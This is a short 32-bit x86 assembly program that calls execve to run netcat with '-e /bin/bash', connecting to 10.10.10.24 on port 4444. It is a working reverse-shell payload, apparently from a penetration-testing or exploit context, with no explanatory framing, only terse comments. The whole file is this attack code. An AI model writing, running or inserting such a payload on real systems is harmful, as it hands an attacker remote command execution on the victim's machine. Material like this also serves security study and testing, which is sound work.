section .data

arg0    db "/bin/nc", 0
arg1    db "10.10.10.24", 0
arg2    db "4444", 0
arg3    db "-e", 0
arg4    db "/bin/bash", 0

        align 4
argv    dd arg0, arg1, arg2, arg3, arg4, 0
envp    dd 0

section .text
        global _start
_start: mov eax, 11   ; SYS_execve
        mov ebx, arg0 ; filanem
        mov ecx, argv ; argv
        mov edx, envp ; envp
        int 0x80      ; syscall
